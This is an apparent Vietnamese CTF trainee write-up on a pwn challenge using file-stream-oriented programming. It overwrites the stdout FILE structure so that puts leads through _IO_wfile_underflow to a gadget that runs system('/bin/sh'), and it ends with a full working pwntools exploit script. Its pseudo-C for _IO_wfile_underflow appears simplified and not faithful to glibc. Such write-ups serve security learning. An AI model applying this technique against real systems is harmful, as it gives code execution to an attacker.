---
title: 'KCSC Trainee Task 6: FSOP EXPOLIT TECH'

---

# KCSC Trainee Task 6: FSOP EXPOLIT TECH
![{67595194-1F24-42E9-8C6A-CF0A5972907F}](https://hackmd.io/_uploads/HJAUOC4Tkx.png)

## IDA
Chúng ta có hàm `main()`:
![{A2CA98DB-0559-4B2F-B882-E5174C1A0CD4}](https://hackmd.io/_uploads/ByAhRN_6yg.png)
> - Đầu tiên một lời gọi mời được in ra kèm với địa chỉ của `_bss_start`.
> - Sau đó ta được yêu cầu để nhập dữ liệu vào `_bss_start` và chương trình thực hiện kiểm tra nếu ta không nhập đủ 224 bytes thì sẽ kết thúc chương trình.
> - Nếu đủ thì chương trình thực hiện tiếp việc cấp phát động một mảng có 232 bytes và giá trị trả về là con trỏ được lưu trong `v4->pad2`.
> - Cuối cùng là thực hiện việc in ra lời dẫn và kết thúc chương trình.

## IDEA
Với việc dữ liệu được nhập vào sẽ ghi đè toàn bộ vào vùng bss_start (là cấu trúc stdout) nên ta sẽ thực hiện kỹ thuật khai thác FSOP bằng cách ghi đè toàn bộ cấu trúc stdout để biến hàm `puts` thành hàm để ta lấy được shell.

## EXPLOIT
### 1.Checksec
![{5ED3278F-24CB-469A-96A8-5C5388196FB8}](https://hackmd.io/_uploads/H193LrOpJx.png)
> Bước này không cần thiết nhưng là một thói quen tốt.

### 2.Setup Fake File Structure
- May mắn là với 224 bytes dữ liệu được cho phép nhập vào thì ta hoàn toàn có thể ghi đè toàn bộ cấu trúc của `stdout`; đồng nghĩa với việc ta có thể ghi đè thay đổi `vtable` để kiểm soát luồng thực thi bằng một hàm khác và ở bài này ta dùng hàm `IO_wfile_underflow`, sau đó gọi hàm `__libio_codecvt_in` để thực hiện ý tưởng của ta vì `IO_wfile_underflow` là một hàm nằm trong vùng các hàm thao tác với file trong libc và có tính hợp lệ khi được kiểm tra và `__libio_codecvt_in` khả thi để thực hiện mục tiêu khai thác là thực thi system('/bin/sh') thông qua việc thiết lập các tham số phù hợp.
- Ta có cấu trúc của `IO_wfile_underflow` trong C:
```c=
/* Hàm `_IO_wfile_underflow` xử lý trường hợp buffer trống trong I/O wide-character stream */
int _IO_wfile_underflow(_IO_FILE *fp) {
    /* Kiểm tra nếu `fp` là NULL */
    if (!fp) 
    {
        return WEOF;
    }

    /* Lấy con trỏ `_wide_data` từ `fp` */
    struct _IO_wide_data *wd = fp-> _wide_data;
    if (!wd) 
    {
        return WEOF;
    }

    /* Kiểm tra nếu đang ở chế độ ghi thay vì đọc */
    if (fp->_mode <= 0) 
    {
        return WEOF;
    }

    /* Nếu con trỏ đọc đã đạt đến cuối file, trả về WEOF */
    if (wd->_IO_read_ptr >= wd->_IO_read_end) 
    {
        if (fp->_flags & _IO_EOF_SEEN) 
        {
            return WEOF;
        }

        /* Thực hiện đọc dữ liệu mới từ file vào buffer */
        ssize_t nread = __woverflow(fp);  // Đọc dữ liệu vào buffer wide-character
        if (nread <= 0) 
        {
            fp->_flags |= _IO_EOF_SEEN;
            return WEOF;
        }
    }

    /* Cập nhật `_IO_read_ptr` và trả về ký tự tiếp theo */
    wint_t wc = *(wd->_IO_read_ptr);
    wd->_IO_read_ptr++;
    return wc;
}
```
Đầu tiên, hàm tiến hành các thao tác kiểm tra tính hợp lệ của con trỏ đến File Structure, lấy Wide data, kiểm tra chế độ của file và sau đó kiểm tra xem con trỏ có đang ở cuối file hay không và nếu không thì tiến hành kiểm tra flag và nhập dữ liệu vào buffer.

Với ý tưởng sử dụng hàm trên để trục tiếp lấy shell, ta cần thiết lập một IO file structure fake thỏa một số điều kiện:
- `Flag`: Ta sẽ thiết lập giá trị flag là `0x3b01010101010101` vì đây là giá trị thường được sử dụng vì có khả năng bypass được các phương thức kiểm tra của hàm.
- `_lock`: Trong quá trình hàm được thực thi thì giá trị này được kiểm tra nên ta sẽ thiết lập thành một địa chỉ mà tại đó giá trị bằng `0`.
- `Vtable`: Với mục tiêu là khi hàm `pusts` được gọi thì hàm được gọi trong `puts` là `IO_wfile_underflow` thì ta sẽ thiết lập giá trị của `vtable` sao cho có thể tham chiếu chuẩn đến hàm cần gọi:
>  Mặc định khi `puts` được gọi thì ngay sau đó thì `_IO_file_xsputn` sẽ được gọi dựa vào offset của nó đến `_IO_file_jumps` (là địa chỉ được thiết lập mặc định tại `vtable` ban đầu) và ta có offset này là `0x38`.
>  Vậy ta sẽ ghi đè `vtable` bằng địa chỉ của hàm mong muốn - 0x38.

Ta cho chạy thử script:
![{B33A6DD8-464F-4D8F-A1A0-69E286CBEA0A}](https://hackmd.io/_uploads/rJDBC8tTkl.png)
- Ta thấy rằng tại đây, hàm thực hiện việc so sánh giá trị thanh ghi rdx và rcx và sẽ nhảy đến offset 1200 nếu giá trị của rdx bé hơn và ta có tại offset 1200 của hàm:
![{25D56012-1A58-4C31-ABBB-A11E41B3959C}](https://hackmd.io/_uploads/ryWk1PFT1x.png)
- Tại offset 1244, chương trình tiến hành gọi hàm `__libio_codecvt_in` vậy ta sẽ thiết lập sao cho điều kiện được kiểm tra thỏa mãn là: rdx < rcx.
- Mà ta thấy rằng rdx được truyền vào giá trị của `_IO_read_ptr` và rcx là `_IO_read_end` nên ta sẽ thiết lập tại `_IO_read_end` là một giá trị nào đó đủ để lớn hơn `_IO_read_ptr`, ta sẽ đặt ở đây là địa chỉ hàm system nhằm phục vụ cho mục đích khai thác.
- Ta tiếp tục cho chạy script và thấy rằng hàm đã thành công gọi `__libio_codecvt_in` nhưng lại bị lỗi vì truy xuất địa chỉ không hợp lệ:
![{22F4DDAC-B074-4C62-A712-29BCF5933576}](https://hackmd.io/_uploads/HyaqGDt6yx.png)
- Hàm đang cố đưa giá trị tại địa chỉ mà rdi đang lưu vào thanh ghi r13, tuy nhiên rdi lúc này đang là 0 và là một địa chỉ không hợp lệ.
- Ta nhìn lại một chút thì thấy rằng rdi được thiết lập bằng cách di chuyển giá trị r14 vào:
![{8E0A3C11-1646-4EFA-A1AB-CA201925895A}](https://hackmd.io/_uploads/HktBQDYTJx.png)
- Ta tiếp tục xem và thấy rằng giá trị được thiết lập cho thanh ghi r14 được lấy từ `IO_file + 152`:
![{2A3C4854-EA8A-404E-911E-60E1CF00D117}](https://hackmd.io/_uploads/Sk6K7wFa1g.png)
- Tương ứng tại đó đang là giá trị của `_codecvt`. Đây là một giá trị cần thiết cho hàm để việc thực thi được trơn tru nên ta sẽ thiết lập thành một địa chỉ phù hợp, ở đây địa chỉ đó sẽ là `IO_file + 168` vì đây là vùng không bị ảnh hưởng trong quá trình thực thi nên ta tạm thiết lập vậy và là để phục vụ cho mục tiêu khai thác. 
- Tuy nhiên, sau đó hàm đồng thời cũng thực hiện việc tham chiếu đến giá trị tại địa chỉ mà thanh ghi r13 đang lưu mà lúc này r13 đang là 0 ( giá trị của địa chỉ `IO_file + 168`) nên ta sẽ tiến hành thiết lập tại đây một địa chỉ phù hợp nữa để có thể vượt qua lần kiểm tra.
- Ta cũng thấy rằng hàm `IO_wfile_underflow` cũng chỉ kiểm tra cách con trỏ đến cái vùng read mà không sử dụng các vùng write nên ta có thể sử dụng các con trỏ write của `IO_file` để lưu dữ liệu và ta sẽ đặt tại `IO_file+168` là `IO_file+24`.
- Tại call rbp:
![{21B146E9-3144-464E-A168-8AB1F5082513}](https://hackmd.io/_uploads/SkseNtFa1g.png)
- Ta thấy rằng hiện tại rbp đang có giá trị là 0 và tại rdi hiện tại cũng là một địa chỉ stack không phải mục tiêu nên để đạt được mục tiêu cần thiết thì ta cần xem quá trình thiết lập giá trị cho rbp và rdi:
> RBP:
> ![{6381C326-B8D6-4138-B42B-0DC6AB7AA567}](https://hackmd.io/_uploads/H1_MHYY6kl.png)
> - rbp sẽ được gán với giá trị tại `IO_file + 64` và vì vậy ta sẽ thiết lập tại đó là một hàm hoặc gadget nào đó.
> 
> RDI:
> ![{6A5A96C8-D648-4154-A759-13666B6945BE}](https://hackmd.io/_uploads/B1XqUFY6kl.png)
> - rdi được gán với giá trị trong thanh ghi r13 lúc này là `IO_file + 24` 
- Với những điều này thì ta không thể đơn giản đặt tại `IO_file + 24` và `IO_file + 64` lần lượt là chuỗi '/bin/sh' và hàm system được vì trước đó chương trình có tiến hành kiểm tra xử lí và thông qua đó làm biến đổi giá trị của hàm system và ta không thể gọi trực tiếp được:
![{48040CD1-7C82-4241-B6B9-CE2317E89913}](https://hackmd.io/_uploads/SySFDYtTye.png)
![{7ABFB656-BA31-42BF-91A1-12A098EFA269}](https://hackmd.io/_uploads/S1r9wKKT1g.png)
- Vậy nên bắt buộc ở đây ta phải gọi hàm system thông qua gadget và phương án khả thi ở đây là một gadget có thể gọi hàm trong thanh ghi rcx (lúc này đang chứa địa chỉ hàm system) và ta có gadget: `add rdi, 0x10; jmp rcx;`
- Với gadget này ta phải thiết lập lại ví trí đặt địa chỉ chuỗi '/bin/sh' thành `IO_file + 24 + 0x10`.

### 3. Cooking shell
Sau tất cả ta sẽ có một fake File Structure được thiết lập như sau:
```python=
IOfile = flat(
    0x3b01010101010101,         # 0x00      0       - Ghi đè `_flags`
    p64(0),                     # 0x08      8       - `_IO_read_ptr`
    p64(sys),                   # 0x10      16      - `_IO_read_end`
    p64(0),                     # 0x18      24      - `_IO_read_base`
    p64(0),                     # 0x20      32      - `_IO_write_base`
    p64(bis),                   # 0x28      40      - `_IO_write_ptr`
    p64(0),                     # 0x30      48      - `_IO_write_end`
    p64(0),                     # 0x38      56      - `_IO_buf_base`
    p64(gad),                   # 0x40      64      - `_IO_buf_end`
    p64(0),                     # 0x48      72      - `_IO_save_base`
    p64(0),                     # 0x50      80      - `_IO_backup_base`
    p64(0),                     # 0x58      88      - `_IO_save_end`
    p64(0),                     # 0x60      96      - `_markers`
    p64(0),                     # 0x68      104     - `_chain`,
    p64(0),                     # 0x70      112     - `_flagno`
    p64(0),                     # 0x78      120     - `_flags2`
    p64(0),                     # 0x80      128     - `_old_offset`
    p64(lock),                  # 0x88      136     - `_lock`
    p64(0),                     # 0x90      144     - `_unused1`
    p64(stdout+168),            # 0x98      152     - `_codecvt
    p64(0),                     # 0xa0      160     - `_wide_data`
    p64(stdout+24),             # 0xa8      168     - `unknown2`
    p64(0),                     # 0xb0      176     - `_unused5`
    p64(0),                     # 0xb8      184     - `_unused6`
    p64(0),                     # 0xc0      192     - `_unused7`
    p64(0),                     # 0xc8      200     - `_unused8`
    p64(0),                     # 0xd0      208     - `_unused9`
    p64(vta),                   # 0xd8      216     - `vtable`
)
```
Và ta cho chạy script:
![{C25AB2AB-C6FC-49D6-89B1-5352799AB017}](https://hackmd.io/_uploads/r11H5ttayg.png)
Vậy ta đã đạt được mục tiêu khai thác.

=> **Challenge hoàn thành !**

## FULL SCRIPT
```python=
#!/usr/bin/env python3

from pwn import *

exe = ELF('asop_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*_IO_wfile_underflow
        b*puts
        b*puts+200
        b*_IO_wfile_underflow+7549
        b*system-744
        c
        ''')
        input()
        # p = gdb.debug([exe.path],"""
        #     b*
        #     c
        #     """)
        # return p


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

ru(b'foundation: ')
stdout = int(rl(),16)
libc.address = stdout - 0x21a780
info("BSS leak: "+hex(stdout))
info("Libc base: "+hex(libc.address))
sys = libc.sym.system
shell = next(libc.search(b"/bin/sh\x00"))
bis = u64(b'/bin/sh\0')

# puts->_IO_wfile_underflow->__libio_codecvt_in
vta = libc.sym._IO_wfile_jumps - 0x18 # IO_wfile_underflow
lock = libc.address+0x219900
gad = libc.address + 0x0000000000163830 # add rdi, 0x10; jmp rcx;

IOfile = flat(
    0x3b01010101010101,         # 0x00      0       - Ghi đè `_flags`
    p64(0),                     # 0x08      8       - `_IO_read_ptr`
    p64(sys),                   # 0x10      16      - `_IO_read_end`
    p64(0),                     # 0x18      24      - `_IO_read_base`
    p64(0),                     # 0x20      32      - `_IO_write_base`
    p64(bis),                   # 0x28      40      - `_IO_write_ptr`
    p64(0),                     # 0x30      48      - `_IO_write_end`
    p64(0),                     # 0x38      56      - `_IO_buf_base`
    p64(gad),                   # 0x40      64      - `_IO_buf_end`
    p64(0),                     # 0x48      72      - `_IO_save_base`
    p64(0),                     # 0x50      80      - `_IO_backup_base`
    p64(0),                     # 0x58      88      - `_IO_save_end`
    p64(0),                     # 0x60      96      - `_markers`
    p64(0),                     # 0x68      104     - `_chain`,
    p64(0),                     # 0x70      112     - `_flagno`
    p64(0),                     # 0x78      120     - `_flags2`
    p64(0),                     # 0x80      128     - `_old_offset`
    p64(lock),                  # 0x88      136     - `_lock`
    p64(0),                     # 0x90      144     - `_unused1`
    p64(stdout+168),            # 0x98      152     - `_codecvt
    p64(0),                     # 0xa0      160     - `_wide_data`
    p64(stdout+24),             # 0xa8      168     - `unknown2`
    p64(0),                     # 0xb0      176     - `_unused5`
    p64(0),                     # 0xb8      184     - `_unused6`
    p64(0),                     # 0xc0      192     - `_unused7`
    p64(0),                     # 0xc8      200     - `_unused8`
    p64(0),                     # 0xd0      208     - `_unused9`
    p64(vta),                   # 0xd8      216     - `vtable`
)

s(IOfile)

p.interactive()
```

